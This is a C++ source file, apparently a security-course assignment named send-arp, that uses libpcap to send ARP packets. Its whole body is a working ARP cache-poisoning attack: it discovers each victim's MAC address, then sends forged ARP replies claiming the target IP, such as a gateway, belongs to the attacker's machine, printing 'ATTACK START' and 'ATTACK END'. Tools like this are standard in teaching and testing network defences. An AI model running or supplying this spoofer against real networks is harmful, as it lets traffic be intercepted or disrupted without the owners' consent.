#include <cstdio>
#include <cstdlib>
#include <pcap.h>
#include <string.h>
#include <stdlib.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "getmyaddr.h"

#define req 0
#define rep 1

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

typedef struct {
	char* dev_;
} Param;

Param param  = {
	.dev_ = NULL //ethernet name
};

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

bool parse(Param* param, int argc, char* argv[]) {
	if (argc < 4) {
		usage();
		return false;
	}
	param->dev_ = argv[1];
	return true;
}

void makeArpPacket(EthArpPacket* packet, Mac eth_dmac, Mac eth_smac, Mac arp_tmac, Mac arp_smac, Ip arp_sip, Ip arp_tip, int flag)
{
	packet->eth_.dmac_ = eth_dmac; //Mac("2c:8d:b1:e9:43:7d");
	packet->eth_.smac_ = eth_smac; //Mac("00:0c:29:4d:48:57");
	packet->eth_.type_ = htons(EthHdr::Arp);
	packet->arp_.hrd_ = htons(ArpHdr::ETHER);
	packet->arp_.pro_ = htons(EthHdr::Ip4);
	packet->arp_.hln_ = Mac::SIZE;
	packet->arp_.pln_ = Ip::SIZE;
	if(flag == rep)
		packet->arp_.op_ = htons(ArpHdr::Reply); 
	else
		packet->arp_.op_ = htons(ArpHdr::Request); 
	packet->arp_.smac_ = arp_smac; //Mac("00:0c:29:4d:48:57"); //refer
	packet->arp_.sip_ = htonl(arp_sip); //htonl(Ip("192.168.1.1")); //refer
	packet->arp_.tmac_ = arp_tmac; //Mac("2c:8d:b1:e9:43:7d");
	packet->arp_.tip_ = htonl(arp_tip); //htonl(Ip("192.168.1.4"));
}

Mac getotherMac(pcap_t* inhandle, Ip tarip)
{
	u_int16_t* ethtype = NULL;
	u_int16_t* arppro = NULL;
	u_int32_t tip_x;
	u_int8_t mac_x[6] = {0x00};
	Ip tip;
	Mac mac;
	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(inhandle, &header, &packet); //problem
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(inhandle));
			return 0;
		}
        	ethtype = (u_int16_t*)(packet+12);
		arppro = (u_int16_t*)(packet+16);
        	if(ntohs(*ethtype) == 0x0806 && ntohs(*arppro) == 0x0800)
		{
			memcpy(&tip_x, packet+28, Ip::SIZE);
			tip = Ip(ntohl(tip_x));
			if(tarip == tip)
			{
				mac_x[0] = *(packet+6); mac_x[1] = *(packet+7); mac_x[2] = *(packet+8);
				mac_x[3] = *(packet+9); mac_x[4] = *(packet+10); mac_x[5] = *(packet+11); 
				mac = mac_x;
				break;
			}
		}
	}
	return mac;
}

int main(int argc, char* argv[]) {
	if (!parse(&param, argc, argv))
		return -1;

	uint8_t my_mac[6] = {0x00};
	getMacAddress(my_mac, argv[1]); //get my mac address
	Mac mac_mine = my_mac;
	Ip my_ip = getIPAddress(argv[1]);

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* outhandle = pcap_open_live(param.dev_, 0, 0, 0, errbuf);
	if (outhandle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", param.dev_, errbuf);
		return -1;
	}
	pcap_t* inhandle = pcap_open_live(param.dev_, BUFSIZ, 1, 1, errbuf);
	if (inhandle == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
		return -1;
	}

	EthArpPacket packet;
	Mac broadcast = Mac("ff:ff:ff:ff:ff:ff");
	Mac forsendermac = Mac("00:00:00:00:00:00");

	Mac sender_mac;
	Ip sender_ip;
	Ip target_ip;
	printf("=====ATTACK START=====\n");
	for(int i = 2;i<argc;i+=2)
	{
		sender_ip = Ip(argv[i]);
		makeArpPacket(&packet, broadcast, my_mac, forsendermac, my_mac, my_ip, sender_ip, req);
		int res = pcap_sendpacket(outhandle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(outhandle));
		}
		sender_mac = getotherMac(inhandle, sender_ip); //problem
		target_ip = Ip(argv[i+1]);
		makeArpPacket(&packet, sender_mac, my_mac, sender_mac, my_mac, target_ip, sender_ip, rep);
		res = pcap_sendpacket(outhandle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(outhandle));
		}
	}
	printf("======ATTACK END======\n");

	pcap_close(outhandle);
	pcap_close(inhandle);
}
